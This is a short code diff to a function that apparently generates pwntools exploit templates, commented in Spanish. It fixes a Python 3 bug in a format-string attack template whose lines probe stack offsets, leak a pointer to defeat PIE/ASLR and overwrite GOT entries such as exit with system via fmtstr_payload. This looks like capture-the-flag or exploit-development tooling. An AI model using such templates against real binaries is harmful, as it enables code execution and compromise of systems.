@@ -568,7 +568,9 @@ def develop_exploit(cls: str, facts: dict, concrete: dict, name: str = "target",
                 "#    for i in range(1,40): p=process(BINARY); p.sendline('%%%d$p'%i); print(i,p.recvline())",
                 "OFFSET = 6   # <-- posicion hallada del buffer en la pila",
                 "# 2) fuga (derrota PIE/ASLR) leyendo un puntero conocido:",
-                "io.sendline(b'%{}$p'.format(OFFSET))",
+                # bug real: bytes no tiene .format() en Python 3 (solo str) -- esto lanzaba
+                # AttributeError en cuanto se ejecutaba, antes de llegar siquiera al leak.
+                "io.sendline(('%%%d$p' % OFFSET).encode())",
                 "leak = int(io.recvline().strip(), 16)   # <-- ajusta el objetivo del leak",
                 "# 3) ESCRITURA arbitraria: pisa GOT (p.ej. exit->win/system) con fmtstr_payload:",
                 "target = elf.got.get('exit') or elf.got.get('printf')",
